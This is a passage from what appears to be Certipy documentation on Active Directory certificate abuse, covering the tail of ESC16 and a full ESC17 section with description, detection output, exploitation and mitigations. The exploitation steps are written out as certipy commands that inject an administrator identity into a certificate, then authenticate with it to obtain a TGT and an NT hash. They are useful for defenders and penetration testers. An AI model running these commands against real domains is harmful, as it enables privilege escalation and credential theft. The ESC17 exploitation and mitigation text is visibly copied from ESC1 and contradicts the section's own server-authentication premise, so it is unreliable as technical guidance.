        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        The CA issues `administrator.pfx`. It lacks the SID security extension (due to ESC16) but contains the attacker-injected SAN UPN and SAN SID URL (due to ESC6). `Certificate object SID is 'S-1-5-21-...-500'` indicates Certipy recognizes the SAN URL SID will be effective.

    * **Step 2: Authenticate using the obtained certificate.**

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*]     SAN URL SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        Authentication is successful. The `Certificate identities` list shows `SAN URL SID`, confirming this SID was present in the certificate (via ESC6) and used by the KDC because the primary SID security extension was absent (due to ESC16).

4. **Mitigations**

    * **Re-enable SID Security Extension on CA (Remove from `DisableExtensionList`):** The primary mitigation is to ensure the CA *is* issuing the SID security extension. If it was manually disabled, remove the OID `1.3.6.1.4.1.311.25.2` (`szOID_NTDS_CA_SECURITY_EXT`) from the CA's `policy\DisableExtensionList` registry key.
        Use `certutil` on the CA server:

        ```bat
        certutil -setreg policy\DisableExtensionList -1.3.6.1.4.1.311.25.2
        net stop certsvc
        net start certsvc
        ```

        *(The `-` prefix before the OID removes it from the list. Verify with `certutil -getreg policy\DisableExtensionList`).*
    * **Ensure CA is Patched (KB5014754 or later):** If the root cause is an unpatched CA server that predates the May 2022 updates, patching the CA with KB5014754 and subsequent cumulative updates is essential so it can generate and include the SID security extension.
    * **Enable Full Strong Certificate Binding Enforcement on DCs:** Configure Domain Controllers to use `StrongCertificateBindingEnforcement = 2` (Full Enforcement Mode). See Microsoft KB5014754 for details. This mode is critical as it requires the SID extension (or a valid SAN SID URL in specific scenarios) for certificate mapping, mitigating UPN-based manipulation when the SID extension is simply missing. Microsoft's timeline indicated this would become the default for new domains from February 2025, with enforcement for existing domains planned for September 2025.

---

## **ESC17 Enrollee-Supplied Subject for Server Authentication**

1. **Description**

    ESC17 is similar to ESC1 but targets templates that allow "Server Authentication". The outcome of an exploitation depends on further prerequisites in the targeted domain (see below). The vulnerability arises when a certificate template is inadequately secured, permitting a low-privileged user to request a certificate and, importantly, specify an arbitrary identity within the certificate's SAN. This allows the attacker to impersonate any server, including administrative ones such as WSUS.
    The combination of these specific weak settings on a single certificate template creates the ESC17 vulnerability:

    * **Enrollee Supplies Subject:** The template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled. In the Certificate Template console, this is the "Supply in the request" option under the "Subject Name" tab. When enabled, the requester - not Active Directory - provides the subject information for the certificate. This is the core setting that allows an attacker to inject a victim's identity (e.g., UPN or DNS name) into the SAN.
    * **Server Authentication EKU:** The template includes an EKU that permits server authentication. Common EKUs that enable this are "Server Authentication" (OID `1.3.6.1.5.5.7.3.1`), the overly permissive "Any Purpose" (OID `2.5.29.37.0`) or no specified EKU at all (which implies any purpose). A certificate with such an EKU can be used for the server component in a TLS-encrypted communication (e.g., an HTTPS server).
    * **Permissive Enrollment Rights:** Low-privileged users or broad groups like "Domain Users" or "Authenticated Users" are granted "Enroll" permissions on the template's security settings. This defines who can request certificates from this template.
    * **No Effective Security Gates:** The template does not enforce manager approval (the "CA certificate manager approval" option in "Issuance Requirements") nor requires authorized signatures (also known as enrollment agent signatures). The absence of these controls means qualifying requests are automatically processed and certificates issued without additional review.

    When these conditions are all met, any user with enrollment rights can submit a CSR for this template. In the CSR, they can specify an arbitrary DNS name in the SAN (e.g., `wsus.corp.local`) and/or a SID in the `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`) or via a specific SAN URL format if the SID extension is not used. The CA, trusting the template's insecure configuration, issues a certificate that appears to belong to the specified DNS name. The attacker can then use this certificate to impersonate a legitimate server, e.g., the internal WSUS server used for distribution of Windows updates. Depending on the specific service, an attacker could learn (plaintext) passwords for privileged accounts, gain access to NTLM hashes (e.g., for relaying) or even abuse the privileges of the service. When ESC17 was first identified, it was used in combination with the WSUS service to achieve code execution on targeted Windows systems. 

    This misconfiguration often occurs when administrators directly use or clone templates like "WebServer" or "SubCA", which already have "Supply in request" enabled by default. In ESC1 scenarios, this setting may often be an oversight and an undesired misconfiguration. In contrast, templates vulnerable against ESC17 are likely used for some kind of server authentication (e.g., securing an internal web application) and therefore use the combination of "Server Authentication" and "Supply in request" deliberately. 

2. **Identification**

   A full ESC17 attack chain does not rely solely on identifying a vulnerable template. One also needs some way to make use of a certificate by finding a desirable service (see "Further prerequisites" down below).

   The first part, identification of a vulnerable template, can be achieved by using Certipy's `find` command in a very similar fashion to the way that ESC1 works.
   Certipy will specifically check for templates where the "Enrollee Supplies Subject" option is enabled, an EKU suitable for sever authentication is present, manager approval and authorized signatures are not required, and it lists the principals (users/groups) that have enrollment rights. The `[+] User Enrollable Principals` field in the output for a template will indicate if the current user context running Certipy has enrollment rights, and through which group membership these rights are granted.

    **Expected Output Snippet:**

    Within the "Certificate Templates" section of the `certipy find` output, vulnerable templates are clearly marked, with "ESC17" listed under the`[!] Vulnerabilities` heading.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
      0
        Template Name                       : VulnTemplate
        Display Name                        : VulnTemplate
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        ...
        Enrollee Supplies Subject           : True
        Certificate Name Flag               : EnrolleeSuppliesSubject
        ...
        Extended Key Usage                  : Server Authentication
        Requires Manager Approval           : False
        ...
        Authorized Signatures Required      : 0
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [!] Vulnerabilities
          ESC17                             : Enrollee supplies subject and template allows server authentication.
        [*] Remarks
          ESC17                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
    ```

    **Key indicators to look for in the output for a specific template:**

    * `[!] Vulnerabilities ESC17 : Enrollee supplies subject and template allows server authentication.` This explicitly flags the vulnerability.
    * `Enrollee Supplies Subject : True` This confirms the setting allowing attacker-defined subjects.
    * `Extended Key Usage : Server Authentication` (or other relevant authentication EKUs) This confirms the certificate can be used for server impersonation.
    * `[+] User Enrollable Principals` showing a group like `CORP.LOCAL\Domain Users` or any group the attacker is a member of. This confirms the attacker has the necessary rights to request a certificate from this template.
    * `Requires Manager Approval : False` and `Authorized Signatures Required : 0` confirm the absence of preventative issuance controls.
  
    **Further prerequisites**

   While the above-mentioned Certipy output confirms the general presence of a vulnerable template, its applicability for an offensive purpose goes beyond ADCS on its own. One also needs to identify a service that grants the attacker an advantage when impersonated **and** there must be some means to actually impersonate this service (think _arp spoofing_, _DNS poisoning_, potentially even _phishing_, ...).  At the time of writing, two attacks are publicly documented that both impersonate the Windows Server Update Service (WSUS) and:
   
   * Relay incoming WSUS update requests to LDAP to impersonate the requesting client.
   * Serve a malicious update to the requesting client achieving command execution.

   Depending on the assignment, many other potential targets are possible. Essentially, an attacker needs to identify both promising domain accounts they would like to compromise and (TLS-protected) servers where they log into using their domain credentials.

2. **Exploitation with Certipy**

    Exploiting an ESC1 vulnerability typically involves two main steps:

    1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target.
    2. Using the obtained certificate to authenticate as the target.

    * **Step 1: Request the certificate for the target user.**
        The attacker (`attacker@corp.local`) uses `certipy req` to request a certificate. They specify the vulnerable template (`VulnTemplate`) and provide the UPN and SID of the desired target account (e.g., `administrator@corp.local`).

        > 💡 **Tip**: To find the SID and other attributes of a target user like 'administrator', you can use the command:
        > `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`

        The command to request the certificate:

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'VulnTemplate' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
        ```

        * `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user performing the request.
        * `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
        * `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
        * `-template 'VulnTemplate'`: The ESC1 vulnerable template.
        * `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN.
        * `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        The output confirms that a certificate was issued. `Got certificate with UPN 'administrator@corp.local'` and `Certificate object SID is 'S-1-5-21-...-500'` show that the CA included the attacker-supplied identity information in the certificate. The certificate and its corresponding private key are saved to `administrator.pfx`.

    * **Step 2: Authenticate using the obtained certificate.**
        The attacker now uses the generated `administrator.pfx` file with `certipy auth` to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        * `-pfx 'administrator.pfx'`: The PFX file containing the impersonation certificate and private key.
        * `-dc-ip '10.0.0.100'`: The IP address of a Domain Controller to authenticate against.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*]     SAN URL SID: 'S-1-5-21-...-500'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        Successful authentication results in a Kerberos TGT for the `administrator` account (saved to `administrator.ccache`), and Certipy will also attempt to retrieve the NTLM hash of the account. The attacker now possesses the means to act as `administrator` within the domain.

    *Note on targeting machine accounts:* If the goal is to impersonate a machine account (e.g., a Domain Controller like `DC01$`), the `-dns` parameter should be used with the FQDN of the machine (e.g., `-dns 'dc01.corp.local'`) instead of `-upn`. This correctly populates the dNSName field in the SAN, which is typically used for machine identity. The `-sid` parameter remains the same, specifying the machine account's SID. While using `-upn` with a machine account's UPN (e.g., `DC01$@corp.local`) might sometimes work, `-dns` is the more appropriate SAN type for machine identities.

3. **Mitigations**

    To prevent ESC1 vulnerabilities, implement the following security measures on your certificate templates:

    * **Disable "Enrollee supplies subject":** For templates intended for user or computer authentication, ensure the subject name source is configured as "Build from this Active Directory information". This setting forces AD to populate the subject details based on the requester's account, preventing attacker-supplied values. Do not use "Supply in the request" unless there is an explicit, well-understood business or technical need, and strong compensating controls (like manager approval) are in place.
    * **Restrict Enrollment Rights:** On the template's Security tab, grant "Enroll" permissions only to the specific users or security groups that legitimately require certificates from that template. Avoid granting these rights to broad, default groups like "Domain Users" or "Authenticated Users" for templates that could be abused.
    * **Implement Manager Approval:** For any template that *must* allow enrollee-supplied subjects, enable the "CA certificate manager approval" option found in the template's "Issuance Requirements" tab. This ensures that each certificate request is held in a pending state until an authorized CA manager reviews and approves it.
    * **Use Authorized Signatures:** If a template is high-impact (e.g., allows enrollee-supplied subjects or issues powerful EKUs), consider requiring one or more authorized signatures for enrollment. This means the CSR must be co-signed by one or more users holding specific "enrollment agent" certificates.
    * **Disable Unused Templates:** If a template is identified as vulnerable (or simply not needed for any legitimate business purpose), disable it by removing it from the list of templates issued by the CA, or by unpublishing it from Active Directory. This removes the attack vector.
